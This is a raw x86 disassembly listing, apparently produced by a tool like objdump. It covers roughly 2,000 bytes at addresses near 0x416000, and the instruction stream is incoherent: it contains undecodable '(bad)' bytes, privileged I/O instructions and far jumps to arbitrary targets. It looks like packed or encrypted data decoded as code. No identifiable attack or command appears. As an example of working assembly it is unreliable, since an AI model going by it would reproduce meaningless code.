  41618f:	mov    esp,0xce7f6479
  416194:	push   ds
  416195:	jle    0x41618f
  416197:	rol    BYTE PTR [ebp+0x3f1795dc],0x63
  41619e:	iret   
  41619f:	jmp    0x416205
  4161a1:	repz mov eax,ds:0x66c538f6
  4161a7:	pop    ebx
  4161a8:	push   ebx
  4161a9:	retf   0x823e
  4161ac:	xchg   edx,eax
  4161ad:	cmp    DWORD PTR [edx-0x49],ebp
  4161b0:	sub    DWORD PTR [esp+edi*8+0x4c],0xffffffba
  4161b5:	loope  0x41614e
  4161b7:	pop    es
  4161b8:	jmp    0xda1249a8
  4161bd:	mov    ds:0xa4293681,al
  4161c2:	pop    edx
  4161c3:	pop    ebp
  4161c4:	mov    esi,0xb34fc0d6
  4161c9:	das    
  4161ca:	popa   
  4161cb:	sti    
  4161cc:	aad    0x16
  4161ce:	aaa    
  4161cf:	ins    BYTE PTR es:[edi],dx
  4161d0:	mov    ch,0xba
  4161d2:	or     eax,0x63eeaf28
  4161d7:	xor    cl,BYTE PTR [ebp-0xb4d15e6]
  4161dd:	xor    eax,DWORD PTR [ebp+0x618a1144]
  4161e3:	bound  ebx,QWORD PTR [eax+0x3e]
  4161e6:	push   es
  4161e7:	aam    0x69
  4161e9:	jmp    0x416227
  4161eb:	sbb    eax,0x62e7295e
  4161f0:	sbb    esp,DWORD PTR [esp+esi*1-0x7e]
  4161f4:	inc    edi
  4161f5:	loop   0x416248
  4161f7:	jo     0x41624b
  4161f9:	sbb    dh,dh
  4161fb:	nop
  4161fc:	cld    
  4161fd:	adc    ecx,DWORD PTR [ebx]
  4161ff:	fsubr  QWORD PTR [esi]
  416201:	(bad)  
  416202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416203:	push   ss
  416204:	sti    
  416205:	mov    ebp,DWORD PTR [edi+0x429efc65]
  41620b:	sub    BYTE PTR [ebx-0x40ea1126],0xe8
  416212:	xchg   esp,eax
  416213:	xor    BYTE PTR [ecx+0x509dabc9],bh
  416219:	div    BYTE PTR [ecx-0x61]
  41621c:	rol    DWORD PTR [ecx],0xf4
  41621f:	les    ecx,FWORD PTR [edx]
  416221:	or     al,0xc
  416223:	add    dh,BYTE PTR [edi-0x47]
  416226:	test   eax,0x50c7cb36
  41622b:	out    dx,al
  41622c:	cmp    BYTE PTR [ecx+0x59],ch
  41622f:	test   BYTE PTR [edx],ah
  416231:	lock mov al,0x40
  416234:	xlat   BYTE PTR ds:[ebx]
  416235:	mov    al,0x84
  416237:	cwde   
  416238:	popf   
  416239:	(bad)  
  41623a:	out    0xb1,eax
  41623c:	jbe    0x416225
  41623e:	cmp    ebp,DWORD PTR [ecx+0x4e83f644]
  416244:	dec    ebp
  416245:	and    eax,DWORD PTR [ecx-0x6346ef30]
  41624b:	and    al,0x23
  41624d:	add    eax,0xe129b3e6
  416252:	pusha  
  416253:	pop    ss
  416254:	lods   al,BYTE PTR ds:[esi]
  416255:	mov    esp,0x24048f58
  41625a:	adc    BYTE PTR [edi],bl
  41625c:	mov    al,ds:0xd857d485
  416261:	sub    DWORD PTR [ecx-0x6e6638c],edx
  416267:	nop
  416268:	ins    DWORD PTR es:[edi],dx
  416269:	sar    BYTE PTR [ebx+eiz*1+0x26],1
  41626d:	addr16 test edi,edi
  416270:	inc    esi
  416271:	add    DWORD PTR [ecx+0x216293ab],edi
  416277:	rcr    BYTE PTR [edx-0x5c],cl
  41627a:	jp     0x41627c
  41627c:	or     eax,0x20757245
  416281:	or     al,0x8a
  416283:	jbe    0x416235
  416285:	sbb    ebp,DWORD PTR [edx+0x26]
  416288:	xchg   edi,eax
  416289:	xchg   ebx,eax
  41628a:	retf   
  41628b:	pop    esp
  41628c:	sbb    BYTE PTR [ebp-0x7],ah
  41628f:	test   al,0x60
  416291:	mov    gs,WORD PTR [edi+esi*2]
  416294:	push   edi
  416295:	cld    
  416296:	mov    esi,0x298d0019
  41629b:	in     eax,0xc0
  41629d:	xor    eax,0xa3bec1df
  4162a2:	jns    0x4162ab
  4162a4:	jg     0x41623d
  4162a6:	scas   eax,DWORD PTR es:[edi]
  4162a7:	ror    DWORD PTR [edx-0x2a],0xe4
  4162ab:	sbb    eax,0x372dfb6
  4162b0:	ret    
  4162b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162b2:	fnstsw WORD PTR [eax+ecx*4-0x71]
  4162b6:	repnz lock out 0x9f,al
  4162ba:	cmp    al,0x5a
  4162bc:	pop    edx
  4162bd:	imul   edi,DWORD PTR [edx],0x2771eb93
  4162c3:	int3   
  4162c4:	psubusw mm7,QWORD PTR [ebx-0x79]
  4162c8:	and    BYTE PTR [edi+ecx*1-0x45],al
  4162cc:	inc    ebp
  4162cd:	int3   
  4162ce:	cdq    
  4162cf:	sub    ch,BYTE PTR [esi+ebp*4-0x3c]
  4162d3:	leave  
  4162d4:	scas   al,BYTE PTR es:[edi]
  4162d5:	mov    ebp,0x5c12f6c8
  4162da:	stos   BYTE PTR es:[edi],al
  4162db:	aad    0x94
  4162dd:	nop
  4162de:	retf   0x130e
  4162e1:	mov    ebx,0xb4408de3
  4162e6:	cdq    
  4162e7:	lea    esp,[ebx-0x13a48abc]
  4162ed:	ss xchg esi,eax
  4162ef:	push   eax
  4162f0:	jno    0x41636e
  4162f2:	es pop ebp
  4162f4:	and    BYTE PTR [eax-0x7c],dl
  4162f7:	pop    esi
  4162f8:	mov    dl,0x2a
  4162fa:	in     al,dx
  4162fb:	(bad)  
  4162fc:	jmp    0xd8cf:0xd76168ff
  416303:	dec    ebx
  416304:	cwde   
  416305:	mov    dh,0x48
  416307:	dec    esi
  416308:	shl    DWORD PTR [ebp+0x26],1
  41630b:	leave  
  41630c:	dec    esp
  41630d:	pushf  
  41630e:	pop    edi
  41630f:	mov    esi,0x6da931e1
  416314:	in     al,dx
  416315:	sub    esi,edx
  416317:	aam    0x7
  416319:	aaa    
  41631a:	and    DWORD PTR [ecx+0x37875298],0xffffff9e
  416321:	in     eax,dx
  416322:	jb     0x416333
  416324:	add    eax,0x68acd136
  416329:	retf   
  41632a:	test   BYTE PTR [ecx],ch
  41632c:	imul   DWORD PTR [edx+0x2b25f1b5]
  416332:	mov    ebp,0x4cf77e
  416337:	mov    al,0x13
  416339:	xchg   edx,eax
  41633a:	push   ecx
  41633b:	and    BYTE PTR [eax-0x4f846682],ch
  416341:	idiv   BYTE PTR [ecx+ebx*4]
  416344:	jmp    0x41638d
  416346:	das    
  416347:	stc    
  416348:	imul   DWORD PTR [ebx-0x15899b7c]
  41634e:	ins    BYTE PTR es:[edi],dx
  41634f:	xchg   esp,eax
  416350:	xchg   DWORD PTR [edx],esi
  416352:	aaa    
  416353:	and    eax,DWORD PTR [esi+0x1f]
  416356:	ret    0x6797
  416359:	push   esi
  41635a:	mov    esp,DWORD PTR [ecx+0x26730efc]
  416360:	call   FWORD PTR ds:0xce4b7f3f
  416366:	cli    
  416367:	cmovb  ebp,DWORD PTR [ebx+esi*1+0x7ab075b5]
  41636f:	daa    
  416370:	or     al,0x87
  416372:	cld    
  416373:	jmp    0x93d8:0x5a11353e
  41637a:	push   ebx
  41637b:	std    
  41637c:	imul   ecx,DWORD PTR [edi],0x95c8b0e6
  416382:	mov    bh,0x47
  416384:	jnp    0x416364
  416386:	out    0x9c,al
  416388:	stos   BYTE PTR es:[edi],al
  416389:	mov    ds:0x3779a793,al
  41638e:	xchg   ebx,eax
  41638f:	fs jno 0x41632e
  416392:	mov    esi,0xbf4f9e59
  416397:	add    DWORD PTR [esi+0x8],edi
  41639a:	mov    ebp,DWORD PTR [ecx+0x2e]
  41639d:	popf   
  41639e:	mov    ecx,esp
  4163a0:	enter  0xbe03,0xd1
  4163a4:	in     al,0x1
  4163a6:	push   ebx
  4163a7:	inc    ecx
  4163a8:	mov    al,ds:0x45cd2c52
  4163ad:	jno    0x4163d5
  4163af:	pop    ebx
  4163b0:	cmp    dh,ah
  4163b2:	jg     0x41639a
  4163b4:	sbb    ebx,DWORD PTR [eax+ebx*1-0x18ac980b]
  4163bb:	repz cmp BYTE PTR [edi-0x1],al
  4163bf:	and    eax,0xe8df7500
  4163c4:	(bad)  
  4163c5:	std    
  4163c6:	addr16 cmp eax,0x4acdc8c7
  4163cc:	call   0x622:0x7d94ca8d
  4163d3:	stc    
  4163d4:	pop    ss
  4163d5:	mov    bh,0xd8
  4163d8:	mov    ds:0x32ffefba,eax
  4163dd:	cmp    ebx,edi
  4163df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e0:	mov    esp,0x25b75d61
  4163e5:	ins    DWORD PTR es:[edi],dx
  4163e6:	push   eax
  4163e7:	xchg   edi,eax
  4163e8:	xor    al,0xdf
  4163ea:	push   0x35
  4163ec:	dec    ebp
  4163ed:	adc    DWORD PTR [ebx],0x30a22e8a
  4163f3:	dec    eax
  4163f4:	jl     0x4163d4
  4163f6:	sub    DWORD PTR [eax-0x68],ebx
  4163f9:	and    edi,DWORD PTR [ebx]
  4163fb:	scas   al,BYTE PTR es:[edi]
  4163fc:	aas    
  4163fd:	arpl   WORD PTR [ecx+0x6ac36175],si
  416403:	sbb    al,0x97
  416405:	and    ebp,DWORD PTR [edx+0xb595a29]
  41640b:	(bad)  
  41640c:	in     al,dx
  41640d:	adc    al,0x2c
  41640f:	(bad)  
  416410:	aad    0x85
  416412:	sub    DWORD PTR [edi],edi
  416414:	push   ecx
  416415:	mov    edx,0x52c0ce6c
  41641a:	cmc    
  41641b:	pop    ds
  41641c:	in     al,dx
  41641d:	lahf   
  41641e:	adc    al,0x6e
  416420:	xor    eax,esi
  416422:	xchg   ebp,eax
  416423:	jb     0x416409
  416425:	sub    eax,0x7da5b6f0
  41642a:	scas   al,BYTE PTR es:[edi]
  41642b:	jae    0x416466
  41642d:	xor    eax,esi
  41642f:	mov    eax,0xce5cda55
  416434:	aad    0x73
  416436:	fstp   QWORD PTR [esi+edx*2]
  416439:	xchg   edi,eax
  41643a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41643b:	sub    esp,DWORD PTR [ecx-0x1e]
  41643e:	fiadd  WORD PTR [ebx+edi*8+0x6c400899]
  416445:	je     0x4163e9
  416447:	push   ebp
  416448:	sub    BYTE PTR [ebx-0x43],dl
  41644b:	fmul   QWORD PTR [ecx+eax*1+0x546219e9]
  416452:	ficom  WORD PTR [eax+eax*8-0x6a31d427]
  416459:	add    esp,DWORD PTR [edx]
  41645b:	and    edi,DWORD PTR ds:0x354e0fe7
  416461:	mov    dl,0x69
  416463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416465:	jecxz  0x416462
  416467:	stos   DWORD PTR es:[edi],eax
  416468:	mov    ch,0xc1
  41646a:	ds jns 0x4164ba
  41646d:	pop    edi
  41646e:	pop    esi
  41646f:	fadd   DWORD PTR [edx+esi*2-0x6b1be65f]
  416476:	jb     0x41641c
  416478:	dec    ebx
  416479:	aad    0x9a
  41647b:	loop   0x4164f7
  41647d:	ficomp DWORD PTR [edi-0x60]
  416480:	sub    DWORD PTR [ebx-0x52],ebx
  416483:	out    0xd,eax
  416485:	aaa    
  416486:	cs pop edi
  416488:	and    edi,DWORD PTR cs:[esi+0x2931a0e4]
  41648f:	mov    esi,0xd7179599
  416494:	mov    edi,0xd2934467
  416499:	sbb    al,0x6b
  41649b:	push   es
  41649c:	xchg   al,ch
  41649e:	lods   eax,DWORD PTR ds:[esi]
  41649f:	rcl    esi,0xe2
  4164a2:	scas   al,BYTE PTR es:[edi]
  4164a3:	pop    es
  4164a4:	xor    dl,cl
  4164a6:	addr16 cld 
  4164a8:	pop    ss
  4164a9:	jbe    0x41645d
  4164ab:	add    ch,dl
  4164ad:	sbb    al,0xde
  4164af:	rcl    cl,1
  4164b1:	inc    esp
  4164b2:	call   0x7b1c6c52
  4164b7:	fwait
  4164b8:	push   edx
  4164b9:	pop    ss
  4164ba:	mov    ds:0x6683a66d,al
  4164bf:	dec    esi
  4164c0:	add    cl,BYTE PTR [esi-0x49071436]
  4164c6:	xor    al,0xa8
  4164c8:	mov    ah,0xfd
  4164ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164cb:	xchg   BYTE PTR [esi+0x16],cl
  4164ce:	ret    
  4164cf:	cmp    eax,0xdd57c6f1
  4164d4:	jl     0x416511
  4164d6:	ds jnp 0x4164d4
  4164d9:	ret    0xd735
  4164dc:	cmp    BYTE PTR [ebx+0x59f22b63],dl
  4164e2:	aaa    
  4164e3:	pushf  
  4164e4:	mov    WORD PTR [ebp+ecx*8-0x62e51d2f],?
  4164eb:	clc    
  4164ec:	mov    al,0xc9
  4164ee:	add    al,0xb9
  4164f0:	fidivr WORD PTR [ecx+0x73]
  4164f3:	ret    0x8544
  4164f6:	lods   eax,DWORD PTR ds:[esi]
  4164f7:	inc    edx
  4164f8:	fs fs jg 0x41655c
  4164fc:	push   esp
  4164fd:	dec    ecx
  4164fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164ff:	das    
  416500:	jno    0x4164db
  416502:	retf   
  416503:	inc    ebp
  416504:	out    0x32,al
  416506:	in     al,dx
  416507:	pop    esp
  416508:	adc    eax,0xb6f4cac9
  41650d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41650e:	add    BYTE PTR [eax-0x4c551507],0xcd
  416515:	mov    al,0x53
  416517:	imul   ecx,esi,0x6b8138e3
  41651d:	mov    cl,0xe
  41651f:	jle    0x41654e
  416521:	mov    bh,0x6c
  416523:	or     ebx,DWORD PTR ds:0xc90be186
  416529:	retf   0x6215
  41652c:	pop    es
  41652d:	jbe    0x41650c
  41652f:	inc    esi
  416530:	ja     0x4164fb
  416532:	or     DWORD PTR [edi+ebx*8+0x6f229096],ebp
  416539:	or     al,0xd1
  41653b:	sbb    ebp,DWORD PTR [ebp+0x4762533e]
  416541:	push   ds
  416542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416543:	pop    ss
  416544:	movhps QWORD PTR [ebx+0x5e],xmm5
  416548:	jae    0x4165bf
  41654a:	(bad)  
  41654b:	sbb    ah,al
  41654d:	addr16 clc 
  41654f:	sar    ch,cl
  416551:	cmp    eax,0x5a3cedec
  416556:	pop    esi
  416557:	sbb    BYTE PTR [ecx-0xe],ch
  41655a:	sti    
  41655b:	jnp    0x41657b
  41655d:	inc    ebx
  41655e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41655f:	pop    esp
  416560:	xor    al,0x2f
  416562:	inc    edi
  416563:	loop   0x4165a5
  416565:	push   ebx
  416566:	cmp    dh,0xc4
  416569:	inc    esi
  41656a:	mov    al,0xd4
  41656c:	mov    al,ds:0x1265d39b
  416571:	inc    ebp
  416572:	test   al,0x98
  416574:	inc    ebp
  416575:	xor    edx,DWORD PTR [ebp+ebp*2-0x14]
  416579:	popa   
  41657a:	hlt    
  41657b:	dec    ebx
  41657c:	aas    
  41657d:	pop    es
  41657e:	sub    ch,ah
  416580:	push   DWORD PTR [edi+0xc9b31fd]
  416586:	jecxz  0x4165bc
  416588:	sub    al,0xf2
  41658a:	test   eax,0xd7767154
  41658f:	dec    ebp
  416590:	aaa    
  416591:	cmp    ebx,ebp
  416593:	mov    ds:0x6022d1bb,al
  416598:	push   esp
  416599:	and    DWORD PTR [ecx],esp
  41659b:	inc    esp
  41659c:	jp     0x4165a4
  41659e:	mov    ebx,0x992ecaf6
  4165a3:	mov    ?,WORD PTR [edi+0x4ad7b399]
  4165a9:	aam    0xf8
  4165ab:	xor    al,0x49
  4165ad:	jmp    0x5832:0x73a69350
  4165b4:	jmp    0xdcf47a94
  4165b9:	shl    bl,cl
  4165bb:	imul   ebp,ebx,0xd0896902
  4165c1:	or     eax,0x50c11d92
  4165c6:	inc    esi
  4165c7:	push   esp
  4165c8:	push   ss
  4165c9:	mov    es,WORD PTR [esi-0x4f]
  4165cc:	push   ss
  4165cd:	mov    esi,0xfd8f28c9
  4165d2:	fidivr WORD PTR [esi]
  4165d4:	mov    dh,ch
  4165d6:	mov    edi,0x33034e74
  4165db:	pop    esp
  4165dc:	sbb    ch,cl
  4165de:	jae    0x4165df
  4165e0:	retf   0x76d1
  4165e3:	dec    ecx
  4165e4:	imul   esi,DWORD PTR [esi+0x5824b2d9],0x2a
  4165eb:	loop   0x41664b
  4165ed:	ins    DWORD PTR es:[edi],dx
  4165ee:	cmc    
  4165ef:	or     bh,BYTE PTR [edx-0x524783f2]
  4165f5:	jl     0x41665b
  4165f7:	popa   
  4165f8:	adc    al,0xee
  4165fa:	daa    
  4165fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165fc:	mov    ecx,0x42f78326
  416601:	mov    ds:0x877f4591,eax
  416606:	sub    ebx,ecx
  416608:	inc    ecx
  416609:	dec    eax
  41660a:	js     0x4165dc
  41660c:	add    eax,0x834f864
  416611:	xchg   edi,eax
  416612:	sbb    eax,0x6b0b1c11
  416617:	push   ecx
  416618:	les    esi,FWORD PTR [eax-0x4c]
  41661b:	sti    
  41661c:	add    ebx,edx
  41661e:	les    edi,FWORD PTR [eax-0x3a980cc]
  416624:	sub    edx,DWORD PTR [ebx+0x23]
  416627:	aaa    
  416628:	pop    ecx
  416629:	cmp    DWORD PTR [edx],edi
  41662b:	xchg   ebp,eax
  41662c:	and    DWORD PTR [ebx],edi
  41662e:	xchg   edx,edi
  416630:	jb     0x416610
  416632:	jmp    0xbe8a:0xaf5d93fb
  416639:	rcr    edx,1
  41663b:	leave  
  41663c:	sahf   
  41663d:	leave  
  41663e:	cmp    eax,0x2180a6c8
  416643:	dec    edi
  416644:	push   ebp
  416645:	adc    eax,0xdb0eb237
  41664a:	push   ebx
  41664b:	sbb    DWORD PTR [ecx-0x45aee418],esi
  416651:	dec    ecx
  416652:	push   eax
  416653:	pop    edi
  416654:	cmp    eax,0x8a3ac77
  416659:	(bad)  
  41665b:	push   es
  41665c:	push   edi
  41665d:	push   ebp
  41665e:	xor    al,0x1e
  416660:	jmp    0x5f38951f
  416665:	gs cld 
  416667:	push   ebp
  416668:	adc    DWORD PTR [edi+0x6a],edi
  41666b:	jp     0x4166de
  41666d:	xor    edx,DWORD PTR [edx+0x956f446]
  416673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416674:	pop    ebx
  416675:	cs push edx
  416677:	add    DWORD PTR [eax],0xffffff87
  41667a:	in     al,0xbb
  41667c:	(bad)  
  41667e:	sbb    DWORD PTR [ecx],0x9af44fb
  416684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416685:	ja     0x416661
  416687:	repz out 0x49,eax
  41668a:	idiv   BYTE PTR [ebx+0x77bdd199]
  416690:	jmp    0xc73b:0x56ffeffd
  416697:	and    DWORD PTR [esi],esp
  416699:	bound  esi,QWORD PTR [eax]
  41669b:	pop    ss
  41669c:	inc    ecx
  41669d:	ja     0x416650
  41669f:	outs   dx,DWORD PTR gs:[esi]
  4166a1:	jns    0x4166e0
  4166a3:	adc    eax,0xa74be693
  4166a8:	mov    cl,0x95
  4166aa:	inc    edx
  4166ab:	cmp    al,0xe9
  4166ad:	(bad)  
  4166ae:	repz sub esi,ebx
  4166b1:	scas   al,BYTE PTR es:[edi]
  4166b2:	int3   
  4166b3:	or     esi,DWORD PTR [edx-0x9]
  4166b6:	xchg   ecx,eax
  4166b7:	jo     0x416695
  4166b9:	sub    ch,BYTE PTR [eax+ebp*1]
  4166bc:	or     edi,ecx
  4166be:	mov    ebx,DWORD PTR [ecx]
  4166c0:	mov    ecx,0x88f8f915
  4166c5:	sub    esp,0xfffffff5
  4166c8:	adc    dh,ch
  4166ca:	inc    esi
  4166cb:	lock mov ecx,0xdd06663b
  4166d1:	jae    0x416736
  4166d3:	and    eax,0x7145c24
  4166d8:	or     al,0xf7
  4166da:	out    0xc1,eax
  4166dc:	leave  
  4166dd:	xor    eax,0x7b1d9742
  4166e2:	test   edx,esi
  4166e4:	sub    cl,dh
  4166e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166e7:	pop    edi
  4166e8:	adc    ah,BYTE PTR [edi+0x5e]
  4166eb:	(bad)  
  4166ec:	and    esp,esp
  4166ee:	xchg   BYTE PTR es:[ebx-0x31],ch
  4166f2:	test   eax,0xffecd089
  4166f7:	adc    esi,DWORD PTR [ebp+0xcc60aa7]
  4166fd:	mov    ds:0x1d596c51,al
  416702:	cmp    BYTE PTR [ebp+0x434fccfb],ch
  416708:	mov    ds:0xd9d97fb0,al
  41670d:	ret    
  41670e:	scas   al,BYTE PTR es:[edi]
  41670f:	jl     0x4166d8
  416711:	sbb    esi,DWORD PTR [esi-0x22]
  416714:	add    BYTE PTR [esi],0x80
  416717:	pop    ebx
  416718:	lds    esp,FWORD PTR [edx+0x16]
  41671b:	jmp    0x10545b4d
  416720:	inc    ecx
  416721:	inc    esi
  416722:	push   ebx
  416723:	jb     0x4166ae
  416725:	mov    bl,0x57
  416727:	and    BYTE PTR [ebx+0x6f3801a2],0x3b
  41672e:	jae    0x4166d4
  416730:	(bad)  
  416731:	out    0x8c,eax
  416733:	test   BYTE PTR [ecx],bh
  416735:	fstp   TBYTE PTR [edi+ebp*1]
  416738:	daa    
  416739:	cmp    dl,0xcf
  41673c:	xor    al,ch
  41673e:	hlt    
  41673f:	sbb    eax,0x7f96cb3d
  416744:	push   edi
  416745:	sbb    ebp,edi
  416747:	mov    bl,BYTE PTR [esi-0x42]
  41674a:	sbb    DWORD PTR [edi+0x53a4665e],esp
  416750:	out    dx,eax
  416751:	cmp    ecx,DWORD PTR [edx+0x71]
  416754:	out    dx,al
  416755:	fcmovnb st,st(4)
  416757:	data16 sbb BYTE PTR [eax+0x5778277c],cl
  41675e:	fcom   DWORD PTR [eax+0x6b]
  416761:	icebp  
  416762:	test   al,0x54
  416764:	mov    dl,0x4
  416766:	gs repz pop ecx
  416769:	mov    bh,0x42
  41676b:	add    al,0x6d
  41676d:	ds or  BYTE PTR es:[edx],bh
  416771:	stos   DWORD PTR es:[edi],eax
  416772:	xlat   BYTE PTR ds:[ebx]
  416773:	xchg   esp,eax
  416774:	scas   eax,DWORD PTR es:[edi]
  416775:	jne    0x416730
  416777:	mov    al,ds:0xbac81428
  41677c:	pop    esp
  41677d:	mov    bl,al
  41677f:	jecxz  0x416793
  416781:	cmp    al,0xff
  416783:	(bad)  [ebp-0x79349516]
  416789:	dec    ecx
  41678a:	mov    ebp,DWORD PTR [ebp-0x7c5c4447]
  416790:	scas   eax,DWORD PTR es:[edi]
  416791:	cmp    edx,DWORD PTR [esi-0x6857c664]
  416797:	dec    ecx
  416798:	adc    DWORD PTR [esi-0x5d60066f],0xffffffd0
  41679f:	lods   al,BYTE PTR ds:[esi]
  4167a0:	cmp    ah,0x35
  4167a3:	sbb    eax,0xe9a407b5
  4167a8:	pusha  
  4167a9:	or     edx,DWORD PTR [eax-0xb]
  4167ac:	adc    ah,BYTE PTR [edi-0x2]
  4167af:	sub    DWORD PTR [esi-0x2f],edi
  4167b2:	adc    bl,bl
  4167b4:	push   0xeb4af1b5
  4167b9:	ret    0x77e3
  4167bc:	(bad)  
  4167bd:	jmp    0x92ff:0xbd8ce914
  4167c4:	mov    al,0x3c
  4167c6:	sub    al,0x3e
  4167c8:	repnz gs cwde 
  4167cb:	jbe    0x41678d
  4167cd:	mov    bl,0xf7
  4167cf:	cmp    BYTE PTR [edx],dl
  4167d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167d2:	mov    ebx,0x9aea7fc0
  4167d7:	xchg   DWORD PTR [ecx+0x43],esi
  4167da:	cmp    al,0x6f
  4167dc:	jbe    0x41679e
  4167de:	mov    ecx,0x77c6e12d
  4167e3:	ins    BYTE PTR es:[edi],dx
  4167e4:	adc    bl,BYTE PTR [edi-0x5233399d]
  4167ea:	daa    
  4167eb:	xor    DWORD PTR [esi+edx*1-0x14c71cd6],edx
  4167f2:	mov    edi,0x97060b13
  4167f7:	sub    al,0xf8
  4167f9:	jp     0x416830
  4167fb:	pop    ecx
  4167fc:	xchg   BYTE PTR [ecx-0x7c],al
  4167ff:	pop    ebp
  416800:	hlt    
  416801:	sub    ebp,DWORD PTR [ebx-0x56ae5969]
  416807:	jbe    0x416806
  416809:	push   es
  41680a:	and    DWORD PTR [eax],esi
  41680c:	mov    ds:0xa47892eb,al
  416811:	and    DWORD PTR [edi],edx
  416813:	xchg   esi,eax
  416814:	mov    ds:0xb530c415,al
  416819:	cld    
  41681a:	out    dx,al
  41681b:	addr16 jl 0x416843
  41681e:	cmp    al,0x23
  416820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416821:	push   esp
  416822:	neg    DWORD PTR [edi+eiz*1+0x35bd489e]
  416829:	inc    esi
  41682a:	mov    esp,0x9ee3fdc3
  41682f:	fsub   DWORD PTR [ebp-0x2a96f0d8]
  416835:	ss jl  0x4167f6
  416838:	push   0xffffff9b
  41683a:	test   cl,ah
  41683c:	in     eax,0x82
  41683e:	xchg   DWORD PTR [ebx-0x6d4677a1],edi
  416844:	cmp    al,0x66
  416846:	mov    bh,0x4f
  416848:	and    BYTE PTR [eax+0x68],ah
  41684b:	push   edx
  41684c:	xchg   ebp,eax
  41684d:	jmp    0x593df3ca
  416852:	jecxz  0x41689f
  416854:	xchg   ebx,eax
  416855:	mov    esp,0x52264df1
  41685a:	or     esi,DWORD PTR [esi+0x75]
  41685d:	mov    DWORD PTR [eax],edx
  41685f:	push   ebp
  416860:	dec    ebp
  416861:	xchg   edx,eax
  416862:	int    0xd5
  416864:	(bad)  
  416865:	test   BYTE PTR [edi],dl
  416867:	enter  0x4df1,0x77
  41686b:	sbb    ebx,esi
  41686d:	cwde   
  41686e:	jb     0x416835
  416870:	xchg   ebp,eax
  416871:	jb     0x41687d
  416873:	push   cs
  416874:	jp     0x41682d
  416876:	icebp  
  416877:	retf   0x3862
  41687a:	inc    esp
  41687b:	call   0x9949d7c8
  416880:	adc    DWORD PTR [esi+0x6cb39526],esi
  416886:	fdivr  st(6),st
  416888:	pop    eax
  416889:	cli    
  41688a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41688b:	scas   eax,DWORD PTR es:[edi]
  41688c:	sub    dh,BYTE PTR [ecx-0x7]
  41688f:	imul   esi,DWORD PTR [edi],0x8
  416892:	arpl   ax,sp
  416894:	dec    ecx
  416895:	lods   eax,DWORD PTR ds:[esi]
  416896:	mov    esp,0xd41926e7
  41689b:	mov    WORD PTR [edx+0x3ea54f3a],ss
  4168a1:	xchg   edx,eax
  4168a2:	ins    DWORD PTR es:[edi],dx
  4168a3:	sub    al,0x74
  4168a5:	sahf   
  4168a6:	je     0x416839
  4168a8:	mov    ebp,0xa505f7fc
  4168ad:	pusha  
  4168ae:	sar    BYTE PTR [edx+edx*4],0xa8
  4168b2:	add    cl,BYTE PTR [edi]
  4168b4:	sbb    al,0xdf
  4168b6:	out    0x8,al
  4168b8:	sbb    BYTE PTR [eax+0x665a4716],dh
  4168be:	rcr    BYTE PTR [edx-0x18],0x33
  4168c2:	mov    bh,BYTE PTR [ebx-0x7f]
  4168c5:	pop    eax
  4168c6:	sbb    DWORD PTR [ebx],esp
  4168c8:	jge    0x416901
  4168ca:	fninit 
  4168cc:	push   esi
  4168cd:	arpl   WORD PTR [eax-0x40],di
  4168d0:	or     BYTE PTR [ebp-0x72],bl
  4168d3:	pop    ebx
  4168d4:	les    esi,FWORD PTR [ebx+0x1ede206a]
  4168da:	push   0x4f053770
  4168df:	dec    ebp
  4168e0:	xor    eax,0xaaea44ad
  4168e5:	mov    cl,0xcb
  4168e7:	(bad)  
  4168e8:	pop    esi
  4168e9:	imul   edi,ebx,0xc39a219f
  4168ef:	inc    esi
  4168f0:	test   BYTE PTR [ebx],cl
  4168f2:	int    0x7e
  4168f4:	cs push edi
  4168f6:	in     al,0xe0
  4168f8:	xor    al,0x4c
  4168fa:	stc    
  4168fb:	jne    0x416939
  4168fd:	adc    DWORD PTR [esi-0x74],esi
  416900:	adc    eax,0xffb2f447
  416905:	adc    dl,BYTE PTR [edi+ecx*2+0x5fbec0b2]
  41690c:	stc    
  41690d:	mov    ds:0x1031429,eax
  416912:	ret    0xb32f
  416915:	retf   0x67e2
  416918:	jnp    0x416964
  41691a:	inc    BYTE PTR [edi]
  41691c:	neg    BYTE PTR [ebp+0x66061573]
  416922:	push   ebp
  416923:	add    ah,BYTE PTR [ebp-0x6f]
  416926:	adc    eax,ebx
  416928:	lds    edi,FWORD PTR [ebx-0x12]
  41692b:	lods   eax,DWORD PTR ds:[esi]
  41692c:	into   
  41692d:	addr16 and ecx,0xffffffee
  416931:	pop    ds
  416932:	pop    esp
  416933:	fsub   DWORD PTR [ecx+0x29]
  416936:	out    dx,al
  416937:	js     0x41697d
  416939:	loopne 0x416986
  41693b:	cmp    DWORD PTR [edx],eax
  41693d:	call   0x305a:0x731647a2
  416944:	nop
  416945:	pop    ss
  416946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416947:	outs   dx,DWORD PTR ds:[esi]
  416948:	mov    ebp,0xb7455261
  41694d:	push   edi
  41694e:	dec    eax
  41694f:	push   ebx
  416950:	cld    
  416951:	cmp    DWORD PTR [eax+0x64e84d6a],edi
  416957:	and    DWORD PTR [eax+0xe6f3c84],0x9594d227
  416961:	lock adc eax,0x52f0836b
  416967:	bound  edx,QWORD PTR [edi]
  416969:	sub    DWORD PTR [edx+ebp*4-0x55],esi
  41696d:	cmc    
  41696e:	cld    
  41696f:	or     eax,0x58be0b94
  416974:	cmp    BYTE PTR [edx+ecx*2-0x6c0f8fd9],al
  41697b:	lea    edx,[edi-0x70fc83de]
  416981:	sbb    BYTE PTR es:0x1199ca18,0xb1
